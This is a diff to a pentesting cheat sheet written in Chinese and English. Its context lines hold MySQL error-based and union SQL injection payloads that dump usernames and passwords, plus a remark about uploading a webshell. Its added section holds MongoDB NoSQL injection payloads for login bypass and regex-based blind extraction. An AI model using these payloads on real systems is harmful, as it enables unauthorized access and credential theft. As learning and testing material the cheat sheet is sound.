@@ -106,7 +106,7 @@ exp(~(select*from(select user())a));  // 內部查詢結果為0, 經過逐位取
 ?id=1" or/and select updatexml(1,concat(1,(select user()),0x7e),1);
 // 由於中間xml語法錯誤，會將database()結果顯示於錯誤訊息
 ```
-  
+
 ### WAF bypass
 WAF is a defender for web.  
 繞過手勢:  
@@ -183,4 +183,37 @@ Here are some tricks of pentesting, step by step from find the vulnerability to 
 // 最終目的
 1' and 1=2 union 1,2,...,group_concat(username,password) from users+--+  
 ```  
-6. After get username and password to login, we can write a webshell to upload!
+6. After get username and password to login, we can write a webshell to upload!  
+
+# NoSQL injection
+MongoDB parse data in json format.  
+Therefore, we can not use string to injection any more, but we can use ```{key:value}``` to get what we want.  
+```sql
+// The list of regex
+$gt: >
+$lt: <
+$gte: >=
+$lte: <=
+$ne: not equal
+$in: in
+$nin: not in
+$not:
+$or
+
+// expression of query
+db.table_name.find({"column_name":value});      // where column = value
+db.table_name.find({"column":{$reg:value}});    // where column $reg value
+```
+
+### pentesting cheatsheet  
+Login first to find other hints
+```sql
+?username[$ne]=\&password[$ne]=\
+```
+Blind injection  
+```sql
+?username=admin&password[$regex]=^a
+```
+
+### Reference
+* [Personal article - first time meet with NoSQL](https://shinmao.github.io/2018/03/01/My-First-NoSQL/)  
